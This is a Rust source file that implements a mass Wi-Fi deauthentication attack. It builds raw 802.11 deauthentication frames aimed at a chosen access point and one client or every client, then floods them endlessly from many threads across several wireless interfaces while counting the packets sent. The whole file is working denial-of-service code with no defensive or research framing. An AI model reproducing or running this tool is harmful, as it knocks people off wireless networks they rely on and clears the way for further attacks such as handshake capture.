use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::thread;

const RADIOTAP: [u8; 12] = [0x00, 0x00, 0x0C, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
const FRAME_LEN: usize = 38;

fn parse_mac(mac: &str) -> Option<[u8; 6]> {
    let parts: Vec<&str> = mac.split(':').collect();
    if parts.len() != 6 { return None; }
    let mut bytes = [0u8; 6];
    for (i, p) in parts.iter().enumerate() {
        bytes[i] = u8::from_str_radix(p, 16).ok()?;
    }
    Some(bytes)
}

fn build_frame(bssid: &[u8; 6], station: &[u8; 6], reason: u16, seq: u16) -> [u8; FRAME_LEN] {
    let mut frame = [0u8; FRAME_LEN];
    frame[0..12].copy_from_slice(&RADIOTAP);
    frame[12] = 0xC0; frame[13] = 0x00;
    frame[14] = 0x3A; frame[15] = 0x01;
    frame[16..22].copy_from_slice(station);
    frame[22..28].copy_from_slice(bssid);
    frame[28..34].copy_from_slice(bssid);
    let sc = (seq << 4) & 0xFFFF;
    frame[34] = (sc & 0xFF) as u8;
    frame[35] = ((sc >> 8) & 0xFF) as u8;
    frame[36] = (reason & 0xFF) as u8;
    frame[37] = ((reason >> 8) & 0xFF) as u8;
    frame
}

pub struct DeauthMassive {
    running: Arc<AtomicBool>,
    total: Arc<AtomicU64>,
    handles: Vec<thread::JoinHandle<()>>,
}

impl DeauthMassive {
    pub fn new(ifaces: &[&str], bssid: &str, station: &str, reason: u16, threads_per_iface: usize) -> Option<Self> {
        let bssid_bytes = parse_mac(bssid)?;
        let station_bytes = if station == "FF:FF:FF:FF:FF:FF" {
            [0xFF; 6]
        } else {
            parse_mac(station)?
        };
        let targeted = station != "FF:FF:FF:FF:FF:FF";
        let running = Arc::new(AtomicBool::new(true));
        let total = Arc::new(AtomicU64::new(0));
        let mut handles = Vec::new();

        for &iface in ifaces {
            for _ in 0..threads_per_iface {
                let r = running.clone();
                let t = total.clone();
                let iface_own = iface.to_string();

                handles.push(thread::spawn(move || {
                    let sock = match crate::raw_injector::RawSocket::open(&iface_own) {
                        Ok(s) => s,
                        Err(e) => {
                            eprintln!("[Rust-v2] Socket {}: {}", iface_own, e);
                            return;
                        }
                    };

                    let mut seq = 0u16;
                    let burst = 128;

                    while r.load(Ordering::Relaxed) {
                        for _ in 0..burst {
                            if !r.load(Ordering::Relaxed) { break; }

                            let frame = build_frame(&bssid_bytes, &station_bytes, reason, seq);
                            seq = (seq + 1) & 0xFFF;
                            if sock.send(&frame).is_ok() {
                                t.fetch_add(1, Ordering::Relaxed);
                            }

                            if targeted {
                                let frame = build_frame(&station_bytes, &bssid_bytes, reason, seq);
                                seq = (seq + 1) & 0xFFF;
                                if sock.send(&frame).is_ok() {
                                    t.fetch_add(1, Ordering::Relaxed);
                                }
                            }
                        }
                    }
                }));
            }
        }

        let iface_count = ifaces.len();
        let r = running.clone();
        let t = total.clone();
        handles.push(thread::spawn(move || {
            while r.load(Ordering::Relaxed) {
                thread::sleep(std::time::Duration::from_secs(1));
                eprintln!("\r[Rust-v2] MASSIVE: {} total across {} ifaces x {} threads",
                         t.load(Ordering::Relaxed), iface_count, threads_per_iface);
            }
        }));

        eprintln!("[Rust-v2] Deauth MASSIVE: {} ifaces x {} threads", iface_count, threads_per_iface);

        Some(DeauthMassive { running, total, handles })
    }

    pub fn stop(&mut self) {
        self.running.store(false, Ordering::Relaxed);
        while let Some(h) = self.handles.pop() {
            let _ = h.join();
        }
    }

    pub fn total(&self) -> u64 {
        self.total.load(Ordering::Relaxed)
    }
}
